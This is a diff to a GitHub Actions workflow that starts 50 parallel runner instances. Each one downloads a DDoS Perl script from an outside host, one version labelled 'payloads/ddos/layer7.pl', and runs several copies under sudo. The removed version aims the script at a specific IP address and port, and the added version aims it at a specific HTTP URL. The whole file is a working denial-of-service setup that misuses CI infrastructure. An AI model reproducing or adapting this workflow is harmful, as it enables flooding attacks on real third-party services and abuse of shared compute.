@@ -1,4 +1,4 @@
-name: TekPoyraz - VAHŞİ OPTİMİZASYON 🔥
+name: TekPoyraz !
 
 on:
   workflow_dispatch:
@@ -14,26 +14,21 @@ jobs:
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]
 
     steps:
-      - name: İndir ve Hazırla
+      - name: OK !
         run: |
-          wget https://wgetz.com/Rv6818n0XE/cacasexdc2.pl -O cacasexdc2.pl
-          chmod +x cacasexdc2.pl
-          
-      - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
-        run: |
+          wget https://github.com/Cisc0-gif/KITT/raw/4ba19aff41f9627d5c7c8a27bcfacb84e253206d/payloads/ddos/layer7.pl -O layer7.pl
+          chmod +x layer7.pl
           PIDS=()
-          # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
-          for i in {1..6}; do
-            sudo timeout 20 perl cacasexdc2.pl 31.40.197.250 22126 1024 20 &
+          for i in {1..4}; do
+            sudo timeout 20 perl layer7.pl http://graph.vshield.pro/ 1400 1400 15 &
             PIDS+=($!)
           done
           
-          # Hepsini bekle ve bitir.
           for pid in "${PIDS[@]}"; do
             wait $pid
           done
 
-      - name: Kapanış
+      - name: OK !
         run: |
           sleep 20
           exit 0
